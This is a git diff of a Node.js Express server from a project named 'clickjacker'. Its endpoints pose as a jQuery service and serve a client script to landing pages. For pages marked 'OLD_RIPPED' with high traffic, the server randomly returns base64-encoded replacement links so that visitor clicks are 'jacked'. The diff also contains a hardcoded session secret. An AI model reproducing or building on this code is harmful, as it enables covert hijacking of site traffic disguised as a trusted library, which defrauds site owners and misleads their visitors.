@@ -25,7 +25,9 @@ var session = require('express-session');
 var bodyParser = require('body-parser');
 var multer = require('multer');
 var errorHandler = require('errorhandler');
-var cookieParser = require('cookie-parser')
+var cookieParser = require('cookie-parser');
+
+var config = require('./config');
 
 //Date prototype for converting Date() to MySQL DateTime format
 Date.prototype.toMysqlFormat = function () {
@@ -37,7 +39,7 @@ String.prototype.replaceAt=function(index, character) {
 }
 
 // all environments
-app.set('port', process.env.PORT || 9000);
+app.set('port', config.port);
 app.set('views', __dirname + '/views');
 app.set('view engine', 'jade');
 //app.use(favicon(__dirname + '/public/favicon.ico'));
@@ -47,7 +49,7 @@ app.use(bodyParser.json());                          // parse application/json
 app.use(cors());
 app.use(bodyParser.urlencoded({ extended: true }));  // parse application/x-www-form-urlencoded
 app.use(multer());                                   // parse multipart/form-data
-app.use(session({ secret: '1234342434324' }));
+app.use(session({ secret: 'foosballIsDaDevil', resave: true, saveUninitialized: true }));
 app.use(methodOverride());
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -57,18 +59,23 @@ app.use(express.static(path.join(__dirname, 'public')));
     app.locals.pretty = true;
 });*/
 
-var connection = mysql.createConnection({
-    host : 'localhost',
-    user : 'root',
-    password : 'derekisfat',
-    database : 'domains_dev'
-});
+var connection = mysql.createConnection(config.db_connection);
 connection.connect();
 
 //change depending on your dev setup or for production
 //var base_clickjacker_dir = "/Users/alfstad/Desktop/clickjacker";
 //var base_clickjacker_dir = "/home/troy/git/clickjacker";
-var base_clickjacker_dir = "/c/Users/Troy/git/clickjacker";
+//var base_clickjacker_dir = "/c/Users/Troy/git/clickjacker";
+var base_clickjacker_dir = config.base_clickjacker_dir ;
+
+//this will probably work on ubuntu but it doesn't work on my windows for some reason
+/*cmd.exec('pwd', function (err, stdout, stderr) {
+        if(err) {
+            console.log(stderr);
+            error = "Error getting the working directory"
+        }
+        base_clickjacker_dir = stdout;
+ });*/
 
 function checkAuth(req, res, next) {
     if (req.session.user_id === 'admin') {
@@ -101,43 +108,71 @@ function getNextCodeDelimiter() {
   return newCode;
 }
 
-function getClientResponseJSON(uuid, url, fn) {
-  /* 1.get the links from the lander_info based on the uuid */
-  var response = "";
-  connection.query("select links_list from lander_info where uuid='" + uuid + "' and registered='1'", function(err, docs) {
-    if(docs.length > 0) {
-      var links = docs[0].links_list;
-      if(links) {
-        var linksArr = links.split(",");
-        /* 2. transform that into base64 code */
-        for(var i=0 ; i<linksArr.length ; i++) {
-          response += new Buffer(linksArr[i]).toString('base64') + getNextCodeDelimiter();
-        }
-      }
-      /* 3. get the rate from pulse table based on url */
-      connection.query("select rate from pulse where url = '" + url +"'", function(err, docs) {
-        if(docs[0] != undefined) {
-          //get random number, if its above 15 dont jack, otherwise jack
-          var randomNumber = Math.random() * 100;
-          if(docs[0].rate > 30) { //views/min
-            if(randomNumber <= 15) {
-                fn({
-                  jquery: response
-                });
-            } else {
-                fn({
-                  jquery: false
-                });
+function getClientResponseJSON(uuid, url, callback) {
+
+    console.log("Making client response...");
+    /* 1.get the links from the lander_info based on the uuid */
+    var response = "";
+    connection.query("select links_list from lander_info where uuid=? and url=?", [uuid, url], function(err, docs) {
+        if(docs.length > 0) {
+            var links = docs[0].links_list;
+            if(links) {
+                var linksArr = links.split(",");
+                /* 2. transform that into base64 code */
+                for(var i=0 ; i<linksArr.length ; i++) {
+                  response += new Buffer(linksArr[i]).toString('base64') + getNextCodeDelimiter();
+                }
             }
-          } else {
-              fn({
-                jquery: false
-              });
-          }
+            /* 3. get the rate from pulse table based on url */
+            connection.query("select rate from pulse where url=?", [url], function(err, docs) {
+                if(docs[0] != undefined) {
+                    //get random number, if its above 15 dont jack, otherwise jack
+                    var randomNumber = Math.random() * 100;
+                    if(docs[0].rate > 30) { //views/min
+                        if(randomNumber <= 15) {
+                            callback({jquery: response});
+                        } 
+                        else {
+                            callback({jquery: false});
+                        }
+                    } 
+                    else {
+                        callback({jquery: false});
+                    }
+                }
+            });
         }
-      });
+    }); 
+}
+
+function formatURL(url) {
+    if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
+       url = "http://" + url;
     }
-  }); 
+
+    if (url.substring(0, 11) == "http://www.") {
+       url = url.replace("http://www.", "http://");
+    }
+
+    if (url.substring(0, 12) == "https://www.") {
+        url = url.replace("https://www.", "http://");
+    }
+
+    if (url.substring(0, 8) == "https://") {
+       url = url.replace("https://", "http://");
+    }
+
+    var lastChar = url.substr(url.length - 1);
+
+    if(lastChar == '/') {
+        url = url.substring(0, url.length - 1);
+    }
+
+    return url;
+}
+
+function getDomain(url) {
+    return urlParser.parse(url).hostname;
 }
 
 function checkAdmin(req, res, next) {
@@ -147,8 +182,6 @@ function checkAdmin(req, res, next) {
         res.redirect('login');
     }
 }
-
-
 
 app.get('/', checkAuth, function( req, res) {
     res.render('index');
@@ -598,56 +631,90 @@ app.get('/jquery', function (req, res) {
 
 app.post('/jquery', function(req, res) {
     var uuid=req.body.version;
-console.log("uuid" + uuid);
+    console.log("uuid" + uuid);
     fs.readFile('./client/landercode.js', function(err, data) {
-      if(err) throw err;
-      var replacedFile = String(data).replace('replacemeuuid', uuid);       
-      res.writeHead(200, {
-        'Content-Length': replacedFile.length,
-        'Content-Type': 'text/plain',
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'GET, OPTIONS',
-        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
-      });
-      res.end(replacedFile);
+        if(err) throw err;
+        var replacedFile = String(data).replace('replacemeuuid', uuid);       
+        res.writeHead(200, {
+            'Content-Length': replacedFile.length,
+            'Content-Type': 'text/plain',
+            'Access-Control-Allow-Origin': '*',
+            'Access-Control-Allow-Methods': 'GET, OPTIONS',
+            'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
+        });
+        res.end(replacedFile);
     });
 });
 
 app.get('/jquery/latest', function (req, res) {
     res.writeHead(301, { //You can use 301, 302 or whatever status code
-      'Location': 'https://github.com/jquery/jquery',
-      'Expires': (new Date()).toGMTString()
+        'Location': 'https://github.com/jquery/jquery',
+        'Expires': (new Date()).toGMTString()
     });
     res.end();
 });
 
 app.post('/jquery/latest', function(req, res) {
-  var url = req.body.referer;
-  var uuid = req.body.version;
-  var datetime = new Date().toMysqlFormat();
-  // var url = "freehairywomen.com";
-  // var uuid = "0c59f130-8044-11e4-98fc-f7d283fea7f2";
-  // var datetime = new Date().toMysqlFormat();
-  connection.query("select process_lander_request(?,?,?) AS value;", [url, uuid, datetime], function(err, docs) {
-    if(docs[0] != undefined) {
-      var response = docs[0].value;
-      //send back data!
-      getClientResponseJSON(uuid, url, function(response) {
+    var url = req.body.referer;
+    var uuid = req.body.version;
+    var datetime = new Date().toMysqlFormat();
+    
+    console.log("Received lander request from " + url + " with uuid = " + uuid);
 
-if(response.jquery == false) { response = ""; }
-else { response = response.jquery; }
+    url = formatURL(url);
+    var domain = getDomain(url);
 
-        res.writeHead(200, {
-        'Content-Length': response.length,
-        'Content-Type': 'text/plain',
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'GET, OPTIONS',
-        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
-      });
-      res.end(response);
-      });
+    console.log("Formatted url to be: " + url);
+    console.log("The domain of the url is: " + domain);
 
-    } else { console.log("your mommas so fat she sat on a dolla and made 4 quarters ;D"); }
+    connection.query("select process_request(?,?,?,?) AS value;", [url, uuid, datetime, domain], function(err, docs) {
+        if(docs[0] != undefined) {
+            var response_string = docs[0].value;
+
+            console.log("Response from process_request: " + response_string);
+            if(response_string == "OLD_RIPPED") {
+                //send back data!
+                getClientResponseJSON(uuid, url, function(response) {
+
+                    console.log("Response to client: " + response);
+
+                    if(response.jquery == false) { 
+                        response = ""; 
+                    }
+                    else { 
+                        response = response.jquery; 
+                    }
+                    res.writeHead(200, {
+                        'Content-Length': response.length,
+                        'Content-Type': 'text/plain',
+                        'Access-Control-Allow-Origin': '*',
+                        'Access-Control-Allow-Methods': 'GET, OPTIONS',
+                        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
+                    });
+                    res.end(response);
+                });
+            }
+            else if(response_string == "UNKNOWN_BEHAVIOR") {
+                console.log("Something went wrong when calling process_request.")
+            }
+            else if(response_string == "UNKNOWN_UUID") {
+                console.log("An unknown uuid (" + uuid + ") was sent to the DB.")
+            }
+            else {
+                response = ""; 
+                res.writeHead(200, {
+                    'Content-Length': response.length,
+                    'Content-Type': 'text/plain',
+                    'Access-Control-Allow-Origin': '*',
+                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
+                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
+                });
+                res.end(response);
+            }
+        }
+        else { 
+            console.log("Failed to get a response from process_request"); 
+        }
   });
 
 });
@@ -715,23 +782,6 @@ function getLanderId(user, callback) {
         }
         callback(lander_id, lander_uuid, error)
     });
-}
-
-function getIndexFilePath(unzipOutput) {
-    //doing this to see if the unzip command created a directory
-    /*  Output of the unzip command is like this if it creates a directory:
-            Archive:  /home/ubuntu/clickjacker_test/sandbox/test.zip\
-            creating: /home/ubuntu/test/public_html3/\
-            inflating: /home/ubuntu/test/public_html3/jquery.js\
-            ...
-        The 3rd word is "creating:" and the 4th word is the directory
-    */
-    var words = unzipOutput.match(/\S+/g); //matches all non-spaces and puts all the words in an array
-    if(words[2] == "creating:") {
-        return words[3];
-    }
-    var str = words[3];
-    return str.substring(0, str.lastIndexOf("/"));
 }
 
 function unzip(zip_path, index_name, zip_name, callback) {
